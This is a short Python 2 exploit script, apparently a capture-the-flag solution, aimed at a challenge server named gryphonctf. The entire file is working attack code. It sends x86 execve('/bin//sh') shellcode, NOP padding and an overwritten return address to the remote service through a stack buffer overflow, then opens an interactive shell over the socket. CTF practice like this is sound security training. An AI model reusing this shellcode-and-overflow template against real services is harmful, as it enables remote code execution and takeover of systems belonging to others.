#!/usr/bin/python
import struct, telnetlib, socket

payload = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
eip = struct.pack("I", 0x804b008)
padding = "\x90" * 47
combined = payload+padding+eip

host = "pwn2.chal.gryphonctf.com"
port = 17344
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(combined+"\n")
s.recv(1024)
print "[*] Exploit successful!"
t = telnetlib.Telnet()
t.sock = s
t.interact()
